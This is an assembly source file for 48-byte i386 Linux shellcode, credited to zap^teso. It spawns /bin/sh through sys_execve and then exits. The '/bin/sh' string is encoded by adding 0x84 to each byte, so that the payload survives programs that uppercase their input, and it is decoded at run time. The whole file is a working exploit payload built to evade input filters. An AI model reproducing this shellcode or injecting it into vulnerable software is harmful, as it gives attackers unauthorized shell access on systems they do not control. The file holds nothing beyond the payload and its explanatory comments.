;------------------------------------------------------------
; toupper-resistant i386/linux-shellcode (48 bytes)
; will exit cleanly after returning from sys_execve
;
; by zap^teso.
;
; linux sys_execve-call:
;   al  : 11 (0x0b)
;   ebx : char * filename
;   ecx : char **argv (argv[0] -> filename, argv[1] -> NULL)
;   edx : char **envp (NULL)
;------------------------------------------------------------

	BITS	32

	jmp	short down
getip:
	pop	ebx			; ebx <- address of shell (char *filename)
	
	mov	eax, 84848484h
	sub	[ebx], eax
	sub	[ebx+4], eax		; subtract 84h from each char in /bin/sh

	xor	eax, eax
	mov	[ebx+7], al		; terminate /bin/sh-string

	lea	ecx, [ebx+8]		; (ebx+8):  char **argv (*filename, NULL)
	lea	edx, [ebx+12]		; (ebx+12): NULL
	mov	[ecx], ebx		; fill in
	mov	[edx], eax		; NULL

	mov	al, 11
	int	80h			; sys_execve

	mov	al, 1			; sys_exit
	int	80h

	; not reached

down:
	call	getip	

shell	db '/'+84h, 'b'+84h, 'i'+84h, 'n'+84h, '/'+84h, 's'+84h, 'h'+84h
